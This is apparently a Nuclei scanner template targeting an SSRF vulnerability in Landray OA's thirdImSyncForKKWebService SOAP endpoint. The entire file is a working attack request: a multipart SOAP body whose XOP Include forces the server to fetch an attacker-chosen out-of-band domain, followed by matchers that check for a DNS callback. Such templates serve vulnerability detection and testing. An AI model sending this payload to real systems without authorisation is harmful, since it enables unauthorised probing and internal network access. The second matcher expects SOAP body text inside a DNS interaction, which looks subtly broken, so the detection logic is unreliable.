folder-7/poc-yaml-landray-thirdimsyncforkkwebservice-ssrf.yaml

id: landray-thirdimsyncforkkwebservice-ssrf
info:
  name: Landray OA thirdImSyncForKKWebService SSRF
  author: ProjectDiscoveryAI
  severity: high
  tags: ssrf,dnslog

variables:
  domain: "{{interactsh-url}}"

http:
  - method: POST
    path:
      - /sys/webservice/thirdImSyncForKKWebService
    headers:
      Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
    body: |-
      ------4upt9dwdca8rtwq9osuz
      Content-Disposition: form-data; name="a"

      <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
      <soapenv:Header/>
      <soapenv:Body>
          <web:sayHello>
              <arg0>
                  <beginTimeStamp>a</beginTimeStamp>
                  <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://{{domain}}"/></count>
              </arg0>
          </web:sayHello>
      </soapenv:Body>
      </soapenv:Envelope>
      ------4upt9dwdca8rtwq9osuz--

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
      - type: word
        part: interactsh_request
        words:
          - "<beginTimeStamp>a</beginTimeStamp>"
